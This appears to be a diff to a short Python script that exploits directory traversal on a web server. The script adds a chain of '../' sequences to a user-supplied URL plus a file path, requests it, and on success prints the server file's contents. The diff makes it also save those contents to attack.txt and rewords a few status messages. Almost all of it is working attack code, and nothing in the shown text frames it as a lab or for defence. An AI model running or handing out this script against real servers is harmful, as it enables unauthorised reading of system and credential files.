@@ -1,7 +1,6 @@
 import requests
 import argparse
 import time
-from colorama import Fore
 
 def banner():
     print('''
@@ -21,7 +20,7 @@ args = parser.parse_args()
 
 payload = '../../../../../../../../../../../../../..'
 url = args.url + payload + args.path
-print("[*]Building payload....[*]\n")
+print("[*]Generating payload....[*]\n")
 time.sleep(1)
 print(url)
 print("\n[*]Checking for directory traversal.....[*]\n")
@@ -32,7 +31,11 @@ try:
     if (r.status_code == 200):
         print("\033[32m[*]Directory traversal successful![*]\033[0m\n")
         print(r.text)
-        print(r.content)
+        file = open("attack.txt", "w")
+        file.write(r.text)
+        file.close()
+        print("\033[35m\n[*]Saved contents to attack.txt[*]\033[0m\n")
+        time.sleep(1)
 except:
     print("\033[31m[*]This webpage is not vulnerable to a directory traversal attack[*]\033[0m")
 
